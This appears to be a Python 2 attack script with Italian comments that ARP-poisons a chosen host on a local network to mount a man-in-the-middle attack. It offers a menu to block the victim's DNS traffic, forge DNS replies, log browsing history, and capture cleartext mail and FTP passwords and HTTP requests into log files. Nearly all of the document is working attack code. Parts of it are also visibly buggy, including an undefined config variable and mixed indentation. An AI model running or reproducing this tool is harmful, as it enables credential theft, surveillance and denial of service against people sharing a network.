#importazione librerie
from scapy.all import Ether, ARP, send, get_if_list, get_if_hwaddr, sniff, TCP, UDP, IP, conf, wrpcap, DNSRR, DNS, DNSQR, IPv6, ICMP
from subprocess import Popen, PIPE
from netaddr import *
import os
import threading
import time
import string
import random
import datetime
import fileinput

#dichiarazione variabili utili
conf.verb = 0                              #annullo i print di scapy                     
local_range = "192.168.1.0/24"             #imposto il range della rete locale
iface = "eth0"                             #imposto la scheda di rete
content_log = "log.txt"                    #nome del file dove vengono salvati i dati sensibili
sniff_file = "traffic.pcap"                #nome del file pcap dove viene salvato il traffico
mitm_b = 0                                 #stato del mitm
sniff_b = 0                                #stato dello sniff
attack_sel = 99				   #numero dell'attacco scelto dall'utente, posto di default a 99
ettercap_file_path= "/etc/ettercap/etter.conf"		#posizione del file etter.conf da modificare

 
#funzione per scrivere sul content_log i dati sensibili 
def write_info(sniffed_content):           
    with open(content_log, "a") as f:
        f.write(sniffed_content)

#funzione per abilitare l'ip forward, l'host sul quale gira lo script diventa un nodo di passaggio per 
#tutti i pacchetti in uscita da parte degli altri host 
def ip_forward_on():                       
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#funzione per disabilitare l'ip forward    
def ip_forward_off():                      
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

#funzione per scrivere le regole del firewall iptables 
def iptables_rules():
    os.system("iptables --flush")
    os.system("iptables --zero")
    os.system("iptables --delete-chain")
    #flush della tabella di natting
    os.system("iptables -F -t nat")
    #accettare il jump dei pacchetti dal localhost
    os.system("iptables --append FORWARD --in-interface {} --jump ACCEPT".format(iface))
    #??
    os.system("iptables --table nat --append POSTROUTING --out-interface {} --jump MASQUERADE".format(iface))

#funzione per pulire le regole del firewall 
def iptables_clean():                      
    os.system("iptables --flush")	
 
#funzione per eseguire un ARP Scan con Nmap della rete locale e scoprire gli host attivi 
def nmap_arp_lan(local_range):             
    try: 
        print "ARP Scanning the local network (Nmap)...wait"
        ip = {}
        nmap = Popen(["nmap", "-sP", local_range], stdout=PIPE)
        output, error = nmap.communicate()
        output = output.split("Nmap scan report for")
        output = output[1:]
        for x in output:
            x = x.split("\n")
            host = x[0].strip()
            latency = x[1].replace("Host is up","").strip()
            latency = latency.replace("Host is up.","").strip()
            latency = latency.replace(").",")").strip()
            if latency == ".":
                latency = "Unknown"
            mac_addr = x[2].replace("MAC Address: ","").strip()
            if "Nmap done" in mac_addr:
                mac_addr = "Unknown"
            ip[host] = latency, mac_addr
        return ip
    #l'eccezione salta nel caso in cui si fermi lo script
    except KeyboardInterrupt:
        print "\nArp Scanning stopped..."
        stop(mitm_b, sniff_b)


#funzione per la scelta dell'attacco da adoperare
def selection_attack():

	global attack_sel
	attack_list = ["[0] | Stop all the victim's output connections (DOS)",
	"[1] | DNS Spoof: redirect host on your website, by cheating DNS replies",
	"[2] | Read navigation history of victim",
	"[3] | Steal Mail credentials (only on IMAP/POP3/SMTP",
	"[4] | Steal FTP Credentials (only on FTP non-secure)",
	"[5] | Read Http victim's requests"]
	for attack in attack_list:
		print attack
    	attack_sel = input("Selection Number: ")
	if attack_sel >= len(attack_list):
		print "invalid choice, retry..."
		selection_attack()
	msg = "attack chosen:"+attack_list[attack_sel]
	print msg
	return attack_sel

#funzione per selezionare un target tra i risultati della scansione        
def selection(ip): 
                             
    iplist = []
    c = 0
    for x in ip.keys():
        target_mac = ip[x][1]
        x = x.split("(")
        try:
            x = x[1].replace(")","")
        except IndexError:
            x = x[0].replace(")","")
        print "Target: [{}] | IP: {} | MAC: {}".format(c, x, target_mac)
        iplist.append([x, target_mac.split()[0]])
        c+=1
    sel = input("Selection Number: ")
    target_host = iplist[sel][0]
    target_mac = iplist[sel][1]
    selection_attack()
	
    if attack_sel == 0:
	#per bloccare il traffico in uscita dall'host vittima bastera' impostare
	#una regola iptables (attacco 0)
	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" --protocol udp --destination-port 53 -j DROP"
 	os.system(iptables_rule) 
	print "Traffic bloccked! Press ctrl+c to stop DOS!"

    if attack_sel == 1:
	#nuove modifiche
	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" --protocol udp --destination-port 53 -j DROP"
 	os.system(iptables_rule) 
	#ettercap_file_editor()
	#write_info(msg)

    return target_host, target_mac, attack_sel
	

#funzione per ottenere l'IP del router ed il MAC del router
def get_router():                                   
    ip_cmd = Popen(["ip", "route"], stdout=PIPE)
    ip_data = ip_cmd.communicate()[0].split("\n")[0].split()
    router_ip = ip_data[2]
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac, router_ip

#funzione di ARP Spoofing   
def arp_poisoning(router_ip, target_host, router_mac, target_mac):  
    #creazione dei pacchetti ARP     
    packet_src = ARP(op="who-has", psrc=router_ip, pdst=target_host,  hwdst=target_mac)
    packet_dst = ARP(op="who-has", psrc=target_host, pdst=router_ip, hwdst=router_mac)
    while True:
	#invio ogni 2 secondi degli Arp advertisement
        send(packet_src)
        send(packet_dst)
        time.sleep(2)

def id_generator(size = 6, chars=string.ascii_lowercase):
	 return ''.join(random.choice(chars) for _ in range(size))

#funzione che si occupa di modificare il file etter.conf di Ettercap affinche'
#lo script funzioni per l'attacco numero 2
def ettercap_file_editor():

	print "editing etter.conf..."
	with open(ettercap_file_conf, 'r') as file:
		filedata = file.read()
	
	#apporto le modifiche al file
	filedata = filedata.replace('ec_uid = 65534', 'ec_uid = 0')
	filedata = filedata.replace('ec_gid = 65534', 'ec_gid = 0')

	filedata = filedata.replace('#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
	filedata = filedata.replace('#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')

	# Write the file out again
	with open(ettercap_file_conf, 'w') as file:
  		file.write(filedata)
	file.close()

#funzione di ripristino del file etter.conf	
def ettercap_file_recovery():
	
	print "recovering etter.conf"
	with open(ettercap_file_conf, 'r') as file:
		filedata = file.read()
	
	#apporto le modifiche al file
	filedata = filedata.replace('ec_uid = 0', 'ec_uid = 65534')
	filedata = filedata.replace('ec_gid = 0', 'ec_gid = 65534')

	filedata = filedata.replace('redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
	filedata = filedata.replace('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')

	# Write the file out again
	with open(ettercap_file_conf, 'w') as file:
  		file.write(filedata)
	file.close()

def build_packet (packet):
#copia ed edit del pacchetto malevolo di risposta

	fake_pkt = Ether()/IP()/UDP()/DNS()
#Ether
	fake_pkt.src = packet.dst	
	fake_pkt.dst = packet.src

#IP
	fake_pkt[IP].dst = packet[IP].src
	fake_pkt[IP].src = '192.168.1.254'
	fake_pkt[IP].version = 4
	fake_pkt[IP].ihl = 5
	fake_pkt[IP].tos = '0x0'
	fake_pkt[IP].len = 159	
	fake_pkt[IP].frag = 0
	fake_pkt[IP].ttl = 64
	fake_pkt[IP].proto = 'udp'
	fake_pkt[IP].chksum = '0xb515'

#UDP
	fake_pkt[UDP].sport = 53
	fake_pkt[UDP].dport = packet[UDP].sport
	fake_pkt[UDP].len = 123
	fake_pkt[UDP].chksum = '0xb515'
			
#DNS
	fake_pkt[DNS].id = packet[DNS].id
	#fake_pkt[DNS].id = 79305
	fake_pkt[DNS].qr = 1
	fake_pkt[DNS].opcode = 'QUERY'
	fake_pkt[DNS].aa = 0
	fake_pkt[DNS].tc = 0
	fake_pkt[DNS].rd = 1
	fake_pkt[DNS].ra = 1
	fake_pkt[DNS].z = 0
	fake_pkt[DNS].ad = 0
	fake_pkt[DNS].cd = 0
	fake_pkt[DNS].rcode = 'ok'
	fake_pkt[DNS].qdcount = 1
	fake_pkt[DNS].ancount = 1
	fake_pkt[DNS].nscount = 2
	fake_pkt[DNS].arcount = 2

	#DNS\qd
	fake_pkt[DNS].qd = packet[DNS].qd
	#fake_pkt[DNS].qd = DNSQR(qname='ciaone', qtype = 'A', qclass = 'IN')
	
	#DNS\an
	fake_pkt[DNS].an = DNSRR(rrname=fake_pkt[DNS].qd.qname, type=1, ttl=14394,rdlen=4, rdata='192.168.1.234')

	#DNS\ns
	fake_pkt[DNS].ns = DNSRR(rrname=fake_pkt[DNS].qd.qname, type='NS', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )/DNSRR(rrname=fake_pkt[DNS].qd.qname, type='NS', rclass = 'IN', ttl=3600, rdlen = 4, rdata='192.168.1.234')

	#DNS\ar
	fake_pkt[DNS].ar= DNSRR(rrname='ns1.es555.nameserver.eu', type='A', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )/DNSRR(rrname='ns1.es555.nameserver.eu', type='A', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )


	return fake_pkt
			
	


#funzione di callback applicata a tutti i pacchetti sniffati da Scapy
def sniff_callback(packet):

#regole dello sniffer
    #analisi dei pacchetti DNS (attacco 1)
    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 1:
	
	dns_port = 53
	print dns_port

	if packet[UDP].dport == dns_port:
		#if packet.haslayer(IP):
			packet.show()
			fake_pkt = build_packet(packet)
			print 'FAKE RESPONSE:' 
			fake_pkt.show()
			send(fake_pkt)
			print 'fake response sent!'

    #analisi dei pacchetti DNS per creare la cronologia (attacco 2)
    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2:

	dns_port = 53
	if packet[UDP].dport == dns_port and "www." in packet[DNS].qd.qname:
		website_read_url = packet[DNS].qd.qname
		time = str(datetime.datetime.now().time())
		msg_history = time+" | "+website_read_url
		print msg_history
		write_info(msg_history)
	  
    ##controllo se e' traffico TCP
    #analisi del traffico mail per rubare le credenziali (attacco 3)             				     
    if packet.haslayer(TCP):                         
        mail_ports = [110, 25, 143] 
	#controllo se le porte sono quelle delle mail                
        if packet[TCP].dport in mail_ports or packet[TCP].sport in mail_ports and attack_sel == 3: 
            if packet[TCP].payload:
                print str(packet[TCP].payload)
                mail_packet = str(packet[TCP].payload)
                if "USER" in mail_packet or "PASS" in mail_packet:
                    print "Src: {} -> Server: {}".format(packet[IP].src, packet[IP].dst)
                    print mail_packet
		    #scrivo i dati sensibili sul .txt
                    write_info(mail_packet)           
	
	#analisi del traffico FTP per rubare eventuali credenziali (attacco 4)
	ftp_port = 21   
	#controllo se si tratta della porta ftp                              
        if packet[TCP].dport == ftp_port or packet[TCP].sport == ftp_port and attack_sel == 4:   
            if packet[TCP].payload:
                ftp_packet = str(packet[TCP].payload)
                if "USER" in ftp_packet or "PASS" in ftp_packet:
                    print "Src: {} -> Server: {}".format(packet[IP].src, packet[IP].dst)
                    print ftp_packet
		    #scrivo i dati sensibili sul .txt
                    write_info(ftp_packet)            
        
	#analisi del traffico HTTP, lettura richieste HTTP (attacco 5)
	http_port = 80                         
	#controllo se si tratta di traffico http
        if packet[TCP].dport == http_port or packet[TCP].sport == http_port and attack_sel == 5 :  		
            if packet[TCP].payload:
                http_packet = str(packet[TCP].payload)
                if "GET" in http_packet:
                    print http_packet
		    time = str(datetime.datetime.now().time())
		    #scrivo i dati sensibili sul .txt
                    write_info(time+"\n"+http_packet) 
		    #scrivo il traffico sul .pcap          
        	    wrpcap(sniff_file, packet)                    


#funzione per sniffare           
def pwd_sniff(iface):           
    #sniffing con Scapy, con regole annesse                  
    sniff(iface=iface, prn=sniff_callback, store=0)

#funzione per fermare tutto 
def stop(mitm_b, sniff_b):                            
    ip_forward_off()
    print "\nIP Forward Disabled"
    iptables_clean()
    print "Firewall rules clean"
    print "Keyboard Interrupt (CTRL+C)...Closing..."
    if mitm_b == 1:
        print "Attack stopped..."
    if sniff_b == 1:
        print "Stop sniffing..."
    if attack_sel == 1:
	ettercap_file_recovery()
    print "Remember to read the log file to have alle the captured infos!"
    exit()

#funzione per avviare lo script
def start():                                        
    try:
	
	mitm_b = 0
	sniff_b = 0
	#pulizia del file di log
	open(content_log, "w")
        ip_forward_on()                             
        print "IP Forward Enabled"
        iptables_rules()                            
        print "Firewall rules written"
        router_mac, router_ip = get_router()        
        print "Router MAC: {}\nRouter IP:{}".format(router_mac, router_ip)
	#ARP Scan
        scan = nmap_arp_lan(local_range) 
	#ottengo il target           
        target_host, target_mac, attack_sel = selection(scan)   
        if target_mac == "Unknown":
            print "Couldn't find MAC...Closing..."
            exit()
        arp = threading.Thread(target=arp_poisoning, args=[router_ip, target_host, router_mac, target_mac])  
        arp.setDaemon(True)
	#ARP Spoofing
        arp.start()                                 
        mitm_b = 1
	
	if attack_sel != 0:
        	print "Attack Started..."       
		sniff = threading.Thread(target=pwd_sniff, args=[iface])
        	sniff.setDaemon(True)
		#avvio lo Sniffing
       		sniff.start()                               
        	sniff_b = 1
        	print "Sniffing network..."
	
	#se il traffico e' bloccato si mostrera' un messaggio diverso	
	else:    
		print 'DOS in progress...'
		
    except KeyboardInterrupt:
        stop(mitm_b, sniff_b)
        return 0, 0
    return mitm_b, sniff_b

#riga che avvia lo script   
mitm_b, sniff_b = start()
 
try:
    while True:
        pass
except KeyboardInterrupt:
    stop(mitm_b, sniff_b)
